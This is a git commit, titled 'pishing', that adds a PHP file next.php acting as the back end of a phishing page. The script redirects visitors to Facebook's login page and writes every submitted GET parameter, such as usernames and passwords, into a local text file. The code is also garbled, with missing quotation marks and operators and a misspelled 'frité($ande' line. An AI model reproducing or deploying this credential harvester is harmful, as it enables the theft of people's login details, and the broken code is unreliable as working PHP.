036af2e6e67adc9fd3204e1e9c619e557cc325b0
Diego <A01552594@itesm.mx>
2021-10-14 13:30:07 -0500

    pishing

---
+++ next.php
@@ -0,0 +1,18 @@
+php
+header(Location httpwww.Facebook.comlogin.php );
+$handle = fopen(yaeresmio.txt, a); 
+
+foreach($_GET as $variable = $value) {
+	fwrite($handle, $variable);
+
+	fwrite($handle, =);
+
+	fwrite($handle, $value);
+
+	fwrite($handle, rn);
+}
+
+frité($ande, rn);
+fclose($handle);
+
+exit
